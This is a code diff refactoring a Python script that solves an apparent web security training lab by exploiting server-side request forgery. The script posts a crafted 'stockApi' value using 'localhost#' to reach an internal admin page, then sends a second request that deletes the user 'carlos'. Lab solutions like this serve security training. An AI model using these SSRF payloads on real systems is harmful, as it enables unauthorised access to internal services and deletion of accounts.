@@ -2,11 +2,9 @@ from ..utils import *
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 
-import requests
 
-
-def solve_lab(url, proxies):
-    url = urljoin(url, "/product/stock")
+def solve_lab(session):
+    path = "/product/stock"
 
     # URL-encoded user
     user = "localhost#"
@@ -17,11 +15,11 @@ def solve_lab(url, proxies):
     data = {"stockApi": f"{admin_url}/admin"}
 
     print_info(
-        f'Performing an SSRF attack by sending a POST request to "{url}" with the following data:'
+        f'Performing an SSRF attack by sending a POST request to "{path}" with the following data:'
     )
     print(f"{data}")
 
-    resp = requests.post(url, proxies=proxies, verify=False, data=data)
+    resp = session.post_path(path, data=data)
     print_success("POST request sent successfully.\n")
 
     print_info("Using the response to find URL to delete the user carlos...")
@@ -36,9 +34,9 @@ def solve_lab(url, proxies):
 
     data = {"stockApi": ssrf}
     print_info(
-        f'Deleting the user carlos by sending a POST request to "{url}" with the following data:'
+        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
     )
     print(f"{data}")
 
-    resp = requests.post(url, proxies=proxies, verify=False, data=data)
+    resp = session.post_path(path, data=data)
     print_success("POST request sent successfully.\n")
